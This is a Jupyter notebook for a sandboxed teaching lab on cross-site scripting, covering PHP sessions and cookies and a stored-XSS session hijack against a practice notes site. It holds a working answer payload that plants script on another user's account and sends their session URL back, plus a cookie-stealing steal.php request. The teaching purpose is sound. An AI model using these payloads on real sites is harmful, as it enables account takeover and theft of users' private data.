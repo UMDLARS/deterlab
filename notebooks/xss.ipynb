{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "editable": true,
    "slideshow": {
     "slide_type": ""
    },
    "tags": []
   },
   "source": [
    "# <strong>Cross-Site Scripting</strong>\n",
    "\n",
    "Cross-Site Scripting (XSS) is an injection attack where hackers deliver a JavaScript payload to execute malicious code whenever someone visits a website. These types of attacks are common on websites that have message boards or comments. There are three types of XSS attacks.\n",
    "\n",
    "<figure><center><img src=\"resources/xss/xss_example.jpg\" style=\"width: 75%; height: 75%;\"></img></center><em><figcaption>Credit: <a href=\"https://spanning.com/blog/cross-site-scripting-web-based-application-security-part-3/\">Spanning</a></figcaption></em></figure>\n",
    "\n",
    "<strong>Reflected XSS</strong> is where JavaScript is injected through an HTTP request. A website that uses CGI (Common Gateway Interface) retrieves parameters through the address bar of a browser. A reflected XSS attack injects HTML or JavaScript into an HTTP request, then tampers with the page that gets rendered to you.\n",
    "\n",
    "Here is an example from <a href=\"https://portswigger.net/web-security/cross-site-scripting\">PortSwigger</a>: \n",
    "\n",
    "```https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>```\n",
    "\n",
    "When the site is accessed, it will render: ```<p>Status: <script>/* Bad stuff here... */</script></p>```\n",
    "\n",
    "The ```<script>``` tag will execute any JavaScript code that the hacker wishes to write.\n",
    "\n",
    "<strong>Stored XSS</strong> is an attack where injected JavaScript is stored on a website by an attacker. For this lab, you will be working with stored XSS payloads. When message boards don't sanitize a user's input, a hacker can write an attack containing ```<script>```, which gets executed whenever that webpage is visited by anyone.\n",
    "\n",
    "<strong>DOM-Based XSS</strong> is an attack similar to reflected XSS attacks, but does not utilize HTTP requests when delivering the payload. Rather than using CGI parameters, a DOM-Based attack does not send data to the server, and the attack is entirely client-side. These attacks are difficult to differentiate from reflected XSS attacks. \n",
    "\n",
    "<strong>This lab will contain three topics, and you will learn the following:</strong>\n",
    "\n",
    "1. PHP Sessions, HTTP Protocols, and ```document.cookie```\n",
    "2. Session Hijacking\n",
    "3. A Large-Scale Application of Cross-Site Scripting"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "editable": true,
    "jupyter": {
     "source_hidden": true
    },
    "jupyterlab-hide-cells:hidden": true,
    "slideshow": {
     "slide_type": ""
    },
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Setting up the lab.\n",
    "import ipywidgets as widgets\n",
    "from IPython.display import display, HTML, Javascript\n",
    "from IPython.core.magic import register_line_magic\n",
    "import os\n",
    "# For accessing the nodes:\n",
    "import subprocess\n",
    "# For the stopexp command:\n",
    "import re\n",
    "\n",
    "# These are pre-set so that the first three steps will work properly, as they all\n",
    "# depend on each other. Remaining booleans will be set in the cells.\n",
    "step1Complete = step2Complete = step3Complete = False\n",
    "\n",
    "# When true, it will not auto-save at each step.\n",
    "runAllSteps = False\n",
    "\n",
    "###### Used for saving notebooks. ######\n",
    "import threading\n",
    "# Threading required in case steps are progressed too quickly.\n",
    "save_lock = threading.Lock()\n",
    "\n",
    "# The save function itself.\n",
    "def save_notebook():\n",
    "    with save_lock:\n",
    "        result = subprocess.run('su - umdsectc -c \"/home/umdsectc/notebooks/resources/save.py intro\"', shell=True, capture_output=True, text=True)\n",
    "\n",
    "# Creating a thread to save the notebook.\n",
    "def trigger_save():\n",
    "    save_thread = threading.Thread(target=save_notebook)\n",
    "    save_thread.start()\n",
    "\n",
    "###### Used for loading notebooks. ######\n",
    "import queue\n",
    "\n",
    "load_lock = threading.Lock()\n",
    "result_queue = queue.Queue()\n",
    "\n",
    "def load_notebook():\n",
    "    with load_lock:\n",
    "        result = subprocess.run('su - umdsectc -c \"/home/umdsectc/notebooks/resources/load.py intro\"', shell=True, capture_output=True, text=True)\n",
    "        result_queue.put(result)  # Put the result in the queue.\n",
    "\n",
    "# Creating a thread to load the notebook.\n",
    "def trigger_load():\n",
    "    load_thread = threading.Thread(target=load_notebook)\n",
    "    load_thread.start()\n",
    "    load_thread.join()  # Wait for the thread to complete before adding result to the queue.\n",
    "    return result_queue.get()  # Get the result from the queue."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 0: Begin the experiment.\n",
    "\n",
    "Click the button to begin creating the experiment."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b9b3b355b887414bb3bb2410801236d1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Button(description='Start Lab', style=ButtonStyle())"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b00b16d6189346eda3a75b30c35c78ed",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Output()"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Click the button below to start the experiment.\n",
    "def startlab(button):\n",
    "    # Defining the lab name.\n",
    "    labname = \"intro\"\n",
    "\n",
    "    # Writing the information to an empty field below the button.\n",
    "    with output0:\n",
    "        output0.clear_output()\n",
    "        \n",
    "        # First, checking if the materialization exists. May have been stopped by a previous lab.\n",
    "        materialPattern = \"real.\" + labname + \".umdsec[a-z]{1,2}\"\n",
    "\n",
    "        # Listing the materializations to find if there's an existing one for this lab.\n",
    "        checkMaterial = os.popen('su - umdsectc -c \"mrg list materializations\"').read()\n",
    "        regex = re.compile(materialPattern)\n",
    "        # Getting the matches:\n",
    "        match = regex.search(checkMaterial)\n",
    "\n",
    "        if match:\n",
    "            display(HTML(\"<span style='color: orange;'>An existing materialization for this lab already exists. </span><span>You might have ran another \\\n",
    "            lab without stopping this one. Attaching the existing materialization.</span>\"))\n",
    "            subprocess.run(f'su - umdsectc -c \"mrg xdc attach xdc '+ match.group(0) + '\"', capture_output=True, text=True, shell=True)\n",
    "            display(HTML(\"<newline><span style='color: green;'><strong>Setup complete. You may begin the lab! </strong></span>\" \\\n",
    "                         \"<span>When you're finished, close your lab at the bottom of the notebook.</span>\"))\n",
    "        \n",
    "        else:\n",
    "            display(HTML(\"<span>No existing materializations are found.</span>\"))\n",
    "        \n",
    "            # Second, start the lab.\n",
    "            display(HTML(\"<span>Starting \" + labname + \" lab. This will take a few minutes to process. Please wait.</span> \\\n",
    "            <span><img width='12px' height='12px' style='margin-left: 3px;' src='resources/loading.gif'></span>\"))\n",
    "            startexp = subprocess.run('su - umdsectc -c \"bash /share/startexp ' + labname + '\"', capture_output=True, text=True, shell=True)\n",
    "            output0.clear_output()\n",
    "            display(HTML(\"<span>Done. Result:</span>\"))\n",
    "            print(startexp.stdout)\n",
    "\n",
    "            # Another lab is already attached to the XDC.\n",
    "            if ((\"XDC already attached\") in startexp.stdout):\n",
    "                existingLab = re.search(r\"real.(.*).umdsec[a-z]{1,2}\", startexp.stdout).group(1)\n",
    "\n",
    "                # Shouldn't happen.\n",
    "                if (labname == existingLab):\n",
    "                    display(HTML(\"<span style='color: red;'>Your lab was already started. </span><span>Please continue to the next step.</span>\"))\n",
    "\n",
    "                # Detaching the existing lab, then attaching the current one.\n",
    "                else:\n",
    "                    display(HTML(\"<span style='color: orange;'>Warning: You did not stop your previous experiment. </span><span>Please stop your experiments \\\n",
    "                    before starting a new one. Detaching the \" + existingLab + \" experiment.</span>\"))\n",
    "                    os.popen('su - umdsectc -c \"mrg xdc detach xdc.umdsectc\"')\n",
    "                    display(HTML(\"<span>Attaching the current lab.</span>\"))\n",
    "                    os.popen('su - umdsectc -c \"mrg xdc attach xdc ' + materialPattern + '\"')\n",
    "    \n",
    "            # Third, get the lab materials onto the node.\n",
    "            display(HTML(\"<span>Allocating lab resources onto the node. <u>Please wait a little longer...</u></span>\"))\n",
    "            runlab = subprocess.run('su - umdsectc -c \"bash /home/runlab ' + labname + '\"', capture_output=True, text=True, shell=True)\n",
    "            display(HTML(\"<newline><span style='color: green;'><strong>Setup complete. You may begin the lab! </strong></span>\" \\\n",
    "                         \"<span>When you're finished, close your lab at the bottom of the notebook. Your lab will be active for one week.</span>\"))\n",
    "\n",
    "# Creating the button.\n",
    "startButton = widgets.Button(description=\"Start Lab\")\n",
    "\n",
    "# Creating an output area.\n",
    "output0 = widgets.Output()\n",
    "\n",
    "# Run the command on click.\n",
    "startButton.on_click(startlab)\n",
    "\n",
    "# Display the output.\n",
    "display(startButton, output0)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you previously stopped your lab, you may restore your progress below by clicking \"Load Lab\". <u>You do not have to load your lab if you signed out, closed your notebook, or exited your node(s) or XDC by using ```exit```.</u>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7250dbaa6dce4473b56f8c7fc3290b78",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Button(description='Load Lab', style=ButtonStyle())"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "edc498eba34246b5bc35aaf615b3aadd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Output()"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Click the button below to load your lab.\n",
    "def loadlab(b):\n",
    "    with output0_2:\n",
    "        output0_2.clear_output()\n",
    "        display(HTML(\"<span>Searching for an existing lab in your notebook...</span>\"))\n",
    "\n",
    "    if (os.path.exists(\"/home/umdsectc/notebooks/saves/umdsectc_intro.tar.gz\")):\n",
    "        with output0_2:\n",
    "            output0_2.clear_output()\n",
    "            display(HTML(\"<span>Loading your lab...</span> \\\n",
    "                <span><img width='12px' height='12px' style='margin-left: 3px;' src='resources/loading.gif'></span>\"))\n",
    "            result = trigger_load()\n",
    "            if (result.returncode == 0):\n",
    "                    output0_2.clear_output()\n",
    "                    display(HTML(\"<span style='color: green;'>Your lab has been successfully loaded.</span>\"))\n",
    "            elif (result.returncode == 2):\n",
    "                    output0_2.clear_output()\n",
    "                    display(HTML(\"<span style='color: red;'>The intro lab is inaccessible. Please start your lab. If you have already started it, wait a minute and try again.</span>\"))\n",
    "            else:\n",
    "                    output0_2.clear_output()\n",
    "                    display(HTML(\"<span style='color: red;'>An error occurred while loading your lab.</span>\"))\n",
    "\n",
    "# Creating the button.\n",
    "loadButton = widgets.Button(description=\"Load Lab\")\n",
    "\n",
    "# Creating an output area.\n",
    "output0_2 = widgets.Output()\n",
    "\n",
    "# Run the command on click.\n",
    "loadButton.on_click(loadlab)\n",
    "\n",
    "# Display the output.\n",
    "display(loadButton, output0_2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <strong>Topic 1: PHP Sessions, HTTP Protocols, and ```document.cookie```</strong>\n",
    "\n",
    "#### <strong>PHP Sessions</strong>\n",
    "\n",
    "PHP is a server-side language that's used in web development. PHP is responsible for back-end development, which consists of handling SQL queries for databases, transactions for businesses, image editing, saving data to a storage container, and much more. For this lab, we are focusing on some important concepts used for handling user information, which are sessions and cookies. \n",
    "\n",
    "<strong>Sessions</strong> are stored on a server, which expire when the browser is closed. Sessions are usually safer, and store content for less time. However, they do not make you invulnerable, which you will discover later in the lab.\n",
    "\n",
    "<strong>Cookies</strong> are stored on the client's browser, which have a set expiration time. Cookies are stored as text files, which the browser retrieves when a website requests them. You may look up where your cookies are stored by your browser, as well as their contents. A hacker can retrieve cookies no different from how you retrieve them. \n",
    "\n",
    "<em>Side note:</em> The European Union requires websites to be GDPR compliant if they use cookies, which is one of the most strict privacy and security laws in the world. If you are interested in reading more about cookies and the GDPR regulation, you may read more <a href=\"https://gdpr.eu/cookies/\">here</a>. \n",
    "\n",
    "It should be clear that cookies are not meant to store private data. The safer alternative to cookies are sessions. Cookies can still be used for storing data that's meant to be public.\n",
    "\n",
    "Sessions and cookies are global variables that are used in PHP, meaning they're usable across all PHP files. They are called with either ```$_SESSION[\"key\"] = value;``` or ```$_COOKIE[\"key\"] = value;```. Before sessions can be used in PHP, a session must be started. Whenever a ```$_SESSION``` variable is used in PHP, you must call ```session_start()``` before the ```$_SESSION``` variable can be used. Sessions can be manually ended by using ```session_destroy()```.\n",
    "\n",
    "#### <strong>HTTP Protocols</strong>\n",
    "\n",
    "An HTTP (Hypertext Transfer Protocol) request is a method of sending information across website pages. We are going to look at ```POST``` and ```GET``` requests for this lab.\n",
    "\n",
    "A <strong>```POST```</strong> request consists of sending data to a website, to which it becomes processed by the server. ```POST``` should not be confused with ```PUT```, where ```PUT``` is mainly used for replacing or updating a certain resource on a server. ```PUT``` requires a specific Uniform Resource Identifier (URI), meaning you must specify the exact path and resource that you want to update.\n",
    "\n",
    "The most common use of a ```POST``` request is submitting a form on a website. The website identifies specific names for each field, like name, email, or an \"accept\" checkbox. Then, when the user ```POST```s the information by clicking submit, the server assigns those names with specific values that the user provided on the form, then processes the information, like adding the values to the database.\n",
    "\n",
    "A <strong>```GET```</strong> request gathers a resource from a server. ```GET``` variables are easy to determine from a PHP website, as they appear in the URL of a website. A ```GET``` variable can be obtained by observing a ```?``` after a ```.php``` extension in the URL, then each subsequent name with a ```=``` is the name and value of each ```GET``` variable.\n",
    "\n",
    "Here is an example: ```https://www.testwebsite.com/index.php?name=umdsecXX&age=21```, where ```name``` is umdsecXX and ```age``` is 21.\n",
    "\n",
    "If you have ```telnet``` installed, you can call a ```GET``` request for the landing page of any website. Simply type ```telnet url 443``` to call an HTTPS request for any provided URL, then type ```GET /``` to get the HTML source code for the landing page of the website.\n",
    "\n",
    "#### <center><strong>Differences Between Both Protocols</strong></center>\n",
    "\n",
    "| Feature        | GET Method                                                                 | POST Method                                                                            |\n",
    "|----------------|----------------------------------------------------------------------------|----------------------------------------------------------------------------------------|\n",
    "| Operation      | Used to retrieve information from the server.                              | Used to send data to the server to create/update a resource.                           |\n",
    "| Data Location  | Appends data to the URL, visible to all.                                   | Includes data in the request body, not displayed in the URL.                           |\n",
    "| Idempotency    | Idempotent; the same request can be repeated with no further changes.      | Non-idempotent; repeating the same request can lead to different results.              |\n",
    "| Data Size      | Limited by the URL length; less data can be sent.                          | No limitations on data size; suitable for large amounts of data.                       |\n",
    "| Caching        | Can be cached.                                                             | Not cached by default.                                                                 |\n",
    "| Security       | Less secure as data is exposed in the URL.                                 | More secure; data is concealed within the request body.                                |\n",
    "| Use Case       | Ideal for searching and retrieving data.                                   | Ideal for transactions and updating data.                                              |\n",
    "\n",
    "\n",
    "<center><em>Source: <a href=\"https://www.akto.io/academy/get-vs-post\">Atko.io</a></center>\n",
    "\n",
    "<br>\n",
    "\n",
    "In PHP, making a ```POST``` request will refresh the page, creating ```$_POST[\"name\"] = key``` variables. These variables go away when the page is refreshed, so you may call them within an \"if\" statement where ```$_SERVER['REQUEST_METHOD'] == 'POST'```. When PHP detects a ```POST``` request, the PHP file will enter this code segment, where you may process the ```POST``` variables. \n",
    "\n",
    "Similarly with ```GET```, you may call ```$var = $_GET[\"key\"]```, allowing PHP to retrieve variables from the address bar.\n",
    "\n",
    "#### <strong>```document.cookie```</strong>\n",
    "\n",
    "The ```document.cookie``` variable is a <strong>JavaScript</strong> variable. JavaScript is a language that's used in browsers, which means that you can debug websites that use JavaScript straight from your browser. Each browser is different, but the general way that you can navigate to a console is by doing:\n",
    "\n",
    "- Right-click on a webpage (does not work in all webpages, like JupyterLab).\n",
    "- Navigate to \"Inspect Element\" or \"Inspect\".\n",
    "- Select \"Console\".\n",
    "\n",
    "Since ```document.cookie``` is a variable, you may simply type ```document.cookie``` within the console to view the value of it.\n",
    "\n",
    "Whenever PHP sets a session variable, the user is assigned a value called ```PHPSESSID```. Although session variables are stored on the server, the session's ID must be stored on the browser. The webpage will identify your session ID, find the variables that are associated with that session ID, then make them available for that specific user. These session variables cannot be viewed by anyone else, unless they have your session ID."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 1: Identifying Your Session ID\n",
    "\n",
    "<strong>This lab is going to require port forwarding, which requires setup on your own, local machine. If you have not already done port forwarding, you will need to follow the steps from this notebook.</strong>\n",
    "\n",
    "<strong>Additionally, this lab will contain two nodes.</strong> Attempting to access a node called ```xss``` will not work! The two nodes for this lab are ```server``` and ```client```. You will be doing all of your work on the ```server``` node.\n",
    "\n",
    "After you have port forwarded to your ```server``` node, access ```localhost:port/cgi-bin/xss_practice.php```, where ```port``` is the number that you used in your SSH statement.\n",
    "\n",
    "<strong>For example</strong>, if you have already set up port forwarding, type the following command into your terminal: ```ssh -L 8080:server:80 umdsecXX-xdc-umdsecXX```, then access the practice page by typing ```localhost:8080/cgi-bin/xss_practice.php``` into your web browser.\n",
    "\n",
    "Once you have navigated to this website, you are going to land on a notes page. The notes page is where users may freely post whatever note that they want, as well as stating who has posted the note.\n",
    "\n",
    "You already have an account for this website. These are your credentials:\n",
    "\n",
    "| Username: | Password:    |\n",
    "|-----------|--------------|\n",
    "|  umdsec   |   hacker123  |\n",
    "\n",
    "Using these credentials, sign into the website.\n",
    "\n",
    "For the first step, figure out what your ```PHPSESSID``` value is. Copy the entire value of this cookie (excluding the ```PHPSESSID=```), then paste it into the sign-in field.\n",
    "\n",
    "Once you have signed-in, click the button to check your work below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <strong>Topic 2: Session Hijacking</strong>\n",
    "\n",
    "You are going to be given three PHP session cookies in plain text. For this topic, you are going to learn how to do a basic XSS attack that will hijack a user's session, giving you permission to sign in to their accounts and view private information.\n",
    "\n",
    "XSS attacks require some inner knowledge with how websites and its server operate. Since you are working in a learning environment, you will be told how ```xss_practice.php``` is setup.\n",
    "\n",
    "```xss_practice.php``` uses a SQL database to store its usernames and the notes written by each user. When a note is saved, the memo is written to the database, and can only be viewed by that user. Currently, you have written one note to the website, and you may delete notes, if you wish. <u>It's not necessary to understand how to use SQL for this lab.</u> It's only important to understand how the notes are being stored.\n",
    "\n",
    "With poor website design, signing into your account will display your ```PHPSESSID``` within the URL of the website. The creator of this website thinks that you do not know what this string is. However, ```PHPSESSID``` is being used for authentication, and displaying it within the URL of the website. Later, you will read why this an unsafe approach to authenticate on the website.\n",
    "\n",
    "Your goal for this topic is figuring out how to write other users' ```PHPSESSID``` variable as a note to your own account. Then, signing into their account and viewing private information that they've stored."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 2: Using Website to Execute JavaScript\n",
    "\n",
    "Open ```xss_practice.php``` in your ```server``` node and observe how the form works for uploading a note to the website. The form has a field called ```user_memo```, which contains the note that the user wrote. Additionally, the form has an input field with the type ```hidden```. These ```hidden``` types are form fields that are not viewable. They contain information that are pre-determined by the website, which in this case, is the username. The username is being stored as a hidden field, as it's required for the SQL database so that the website knows who wrote each note. <u>Although the input is type ```hidden```, you can still see this field in the source code of the HTML. You may find it yourself by using Inspect Element.</u>\n",
    "\n",
    "When a form is submitted, a ```POST``` request is sent to ```submit_note.php```, where the server takes the ```POST``` information from the form, then writes it to the database by safely using prepared statements. \n",
    "\n",
    "<em>If you have already done the \"SQL Injection\" lab, then you will notice that the form is not vulnerable to SQL injection. This means you cannot view other users' information by using SQL injection.</em>\n",
    "\n",
    "First, you will start with a basic XSS attack. This attack will not affect anybody yet, but it will be the most basic form of JavaScript injection that you could perform.\n",
    "\n",
    "<strong>Your task:</strong> Write a ```<script>``` block as a note on the website. Within the script block, use ```console.log()``` to write the value of ```2 * 31```.\n",
    "\n",
    "<u>Tips:</u>\n",
    "- Use Inspect Element on your browser to view the \"Console\". The console is where you will be able to view the result of your payload.\n",
    "- Since your payload is containing a ```<script>``` tag, it will not render. If you are not seeing a message displaying on the website, then your payload is working."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 3: Discovering an Exploit\n",
    "\n",
    "Recently, you discovered another user who exists on the website who managed to take the username: ```Hacker```. You want to attempt to access their account without knowing the password for it. Currently, this is what you know about the website:\n",
    "\n",
    "- Uploading a note to the website only requires the username and note content through a POST request.\n",
    "- You cannot view notes that are made by other users.\n",
    "- JavaScript is freely executing through your notes that you upload.\n",
    "\n",
    "Using this information, an opportunity arises. You can post notes onto someone else's account, just as long as you know the username of the account. This means when a user accesses their account, any code that you write to their account will be executed.\n",
    "\n",
    "JavaScript can call an HTTP request by using either ```fetch``` or ```XMLHttpRequest```. The ```fetch``` statement will be used as an example, since ```XMLHttpRequest``` requires multiple calls. Here is an example of a ```fetch``` statement to ```POST``` information to a specific form/website:\n",
    "\n",
    "```\n",
    "<script>\n",
    "  fetch(\"submit_note.php\", {\n",
    "    method: \"POST\",\n",
    "    headers: {\n",
    "      \"Content-Type\": \"application/x-www-form-urlencoded\"\n",
    "    },\n",
    "    body: \"key=value\"\n",
    "  });\n",
    "</script>\n",
    "```\n",
    "\n",
    "A breakdown:\n",
    "- ```method``` allows you to choose your HTTP request. In this case, a ```POST``` request.\n",
    "- ```headers``` allow you to create additional instructions for your HTTP request.\n",
    "- ```Content-Type``` indicates what type of information is being sent within the body of the request. In this case, ```application/x-www-form-urlencoded``` encoded key-value pairs through HTML requests. You can read more about these from <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type\">Mozilla's documentation</a>.\n",
    "- ```body``` stores the information that you're sending with the request.\n",
    "\n",
    "<strong>Your task:</strong> Create a ```<script>``` tag that executes the following information within your account:\n",
    "- Create a ```POST``` request to the ```submit_note.php``` page which contains the following information:\n",
    "  - The username ```Hacker```.\n",
    "  - A note with any content you'd like to post to ```Hacker```. Such as: \"I'm in your account.\" or \"This website is unsafe!\" Your work will not be checked for using these two ideas. Feel free to use whichever message you'd like.\n",
    "\n",
    "This is what your attack should be doing:\n",
    "- Your payload gets posted as a note to your website, which should not display because your ```<script>``` tag is being rendered by the HTML page.\n",
    "- Each time that your website gets refreshed, your ```<script>``` tag is executing, which creates a note on ```Hacker```'s, account.\n",
    "- ```Hacker``` will see a new note posted with your content posted on it.\n",
    "\n",
    "A button called <strong>Peek</strong> is located at the top of the website. This button will sign into ```Hacker```'s account, then print their notes on the same page that you're on. Feel free to click on this button to check your work.\n",
    "\n",
    "Remember to use the \"Console\" in your browser to view any JavaScript warnings/errors that you may be receiving from your message. You may always click on the \"Reset\" button at the top of the website to reset the entire website to its original state, or delete individual messages by clicking the \"Delete\" button."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 4: Stealing Someone's Information\n",
    "\n",
    "Now, you are successfully able to post content on someone else's account by using a XSS attack. At the moment, your attack is not stealing data from users. Like you have seen already, everyone who accesses the website has ```PHPSESSID``` stored as a ```document.cookie``` variable. \n",
    "\n",
    "From the previous step, you have a working payload that allows you to post whatever you want onto someone else's account. Now, whenever ```Hacker``` accesses their website, you want to deliver a ```POST``` request that sends their ```document.cookie``` value to your OWN account.\n",
    "\n",
    "However, you noticed that when you're signed into your account, there is a value called ```token``` inside of the URL. This means that if you have the ```PHPSESSID``` value of someone else's account, you may sign into their account without knowing their password.\n",
    "\n",
    "With some careful thought, this is the outline that you plan to use:\n",
    "- Write a ```fetch``` request that writes a note onto ```Hacker```'s account (using ```write_note.php```).\n",
    "- ```Hacker``` opens the page and executes infected JavaScript code that you wrote to their account.\n",
    "- The infected JavaScript code retrieves the current URL of ```Hacker```'s website, which contains his cookie.\n",
    "- Your payload takes the URL that ```Hacker``` is currently on, then sends it as a note to your account.\n",
    "\n",
    "<strong>Your task:</strong> From the previous step, you already have a template for how to write a note onto ```Hacker```'s account. Copy your entire payload (including the ```<script>``` tags), and inside of the body of your ```fetch``` statement, set the ```username``` to ```umdsec```, and the ```note``` to the payload that you just copied.\n",
    "\n",
    "The <strong>Peek</strong> button is now named <strong>Call User</strong>. This button will sign ```Hacker``` into their account, then notify you when they have accessed the account. Once this is done, your page will refresh and show if your exploit has worked. \n",
    "\n",
    "<u>Tips</u>:\n",
    "- ```location.href``` returns the URL of the current page where the JavaScript is executing. Use this to get the URL of ```Hacker```'s account.\n",
    "- Using a URL within a ```POST``` request can cause undefined behavior, as special characters within the URL, such as ```, / ? : @ & = + $ #``` can break the data being sent in the ```POST``` request. When handling the URL of ```Hacker```'s website, use ```encodeURIComponent()``` on the URL to safely escape it within the body of your ```POST``` statement."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Answer:\n",
    "```\n",
    "<script>\n",
    "  fetch(\"submit_note.php\", {\n",
    "    method: \"POST\",\n",
    "    headers: {\n",
    "      \"Content-Type\": \"application/x-www-form-urlencoded\"\n",
    "    },\n",
    "    body: `username=Hacker&note=\n",
    "            <script>\n",
    "             var url = location.href;\n",
    "             fetch('submit_note.php', {\n",
    "               method: 'POST',\n",
    "               headers: {\n",
    "                 'Content-Type': 'application/x-www-form-urlencoded'\n",
    "               },\n",
    "               body: 'username=umdsec&note=' + encodeURIComponent(url)\n",
    "             });\n",
    "           </script>`\n",
    "  });\n",
    "</script>\n",
    "```\n",
    "\n",
    "Break down steps a little more:\n",
    "- Create an additional step that breaks apart the \"send note back\" and \"send URL back\".\n",
    "- Instead of PHPSESSID, create a random token instead that gets created during runlab. Store in SQL. Emphasize to students the poor design choice.\n",
    "- Create node called ```Teshwan``` which is the hacker. This node will contain the ```steal.php``` file.\n",
    "- Rearrange the mention of \"token\" until the token is ready to be discussed. Same with ```document.cookie``` with the Sloth's Unlimited website.\n",
    "- Token should not be ```PHPSESSID```. Create a different ID instead and use that for authentication."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 5: Accessing Someone's Information\n",
    "\n",
    "In the previous step, you successfully stole the URL of ```Hacker```'s account. Now, you may access their account and read their notes.\n",
    "\n",
    "Click on the URL that was written to your notes. ```PHPSESSID``` stored in the URL of the website will allow you to sign in as ```Hacker``` without a password.\n",
    "\n",
    "Using the blank below, type in ```Hacker```'s credit card number that they stored on the website."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <strong>Topic 3: A Large-Scale Application of Cross-Site Scripting</strong>\n",
    "\n",
    "The developers of the notes website has now moved to another project called Sloth's Unlimited. After learning about the security vulnerability on their previous website, they decided to recreate the website with a sanitization function. In hopes of avoiding another security exploit, they asked you to try breaking the website with your knowledge in cross-site scripting.\n",
    "\n",
    "<strong>You are strongly encouraged to read about the outline of the website before continuing to the first step in this topic.</strong>\n",
    "\n",
    "There are two nodes in this lab: ```client``` and ```server```. On the ```server``` node, a script is running permanently in the background which accesses every page of the website every few seconds. The script will be actively running cURL requests to access the website from the ```client``` node. \n",
    "\n",
    "These are the following IP addresses that will be important to know for the lab:\n",
    "\n",
    "| Nodes:        | ```client```   | ```server```   |\n",
    "|---------------|----------------|----------------|\n",
    "| IP Addresses: | ```10.0.1.1``` | ```10.0.1.2``` |\n",
    "\n",
    "On the website, you will need to create an account to sign into the forum. Once an account is made, you may begin posting. You may choose whatever topic that you would like to post on, or create your own topic.\n",
    "\n",
    "The ```client``` node (```10.0.1.1```) has a file on it called ```steal.php```. This file takes a PHP parameter called ```cookie```, which takes the ```PHPSESSID``` token, then attempts to create a new category called ```Eagles``` with it. Creating a new category requires admin privileges, and the ```client``` node has the admin privileges that you are trying to steal.\n",
    "\n",
    "<u>Here is the ultimate goal of the following few steps:</u> You are going to write a payload script that ```client``` will eventually run. The ```client``` node has access to the ```server``` node, meaning that it will be able to access ```steal.php``` which is stored on ```10.0.1.2```. This means you will need to find a way to make ```client``` call ```http://10.0.1.2/steal.php?cookie=COOKIE_VALUE```.\n",
    "\n",
    "<u>Here are some important considerations when writing your payload</u>:\n",
    "- ```client``` will work automatically, assuming that the script hasn't been stopped. You will begin the script in the first step of this topic.\n",
    "- You do not have to access the ```client``` node for this lab. You only need to access the ```server``` node.\n",
    "  - If you haven't already, you will need to port forward from the ```server``` node.\n",
    "- In order to make ```client``` access the ```steal.php``` value, you may either use a redirection in your payload, or attempt to use a HTTP request, like you have done in the previous topic.\n",
    "- The ```COOKIE_VALUE``` is the entirety of ```document.cookie``` in JavaScript. You are not required to split the variable or use regular expressions."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 6: Running The ```client``` Script\n",
    "\n",
    "In order for your exploit to work, you will need to start a script that will recreate the ```client``` accessing the website. Due to the functionality of JupyterLab, this cannot be done within your notebook. You will need to perform the following steps:\n",
    "\n",
    "1. Open a new tab in JupyterLab.\n",
    "2. SSH into your ```umdsecXX``` account, then SSH into your ```server``` node.\n",
    "3. Navigate to ```/lab```.\n",
    "4. Type ```./run_script```.\n",
    "\n",
    "<strong>You must keep this tab open while testing your exploit.</strong> JupyterLab does not have a built-in terminal, and can only display terminal output when a script is finished. Since this is an endless script, it will need to keep running. The script will end when you press ```Ctrl + C```. It will continue to run when you close out of JupyterLab.\n",
    "\n",
    "On some occasions, the script may time out. When this happens, you will need to navigate back to ```/lab``` in your ```server``` node, then re-run ```./run_script```."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
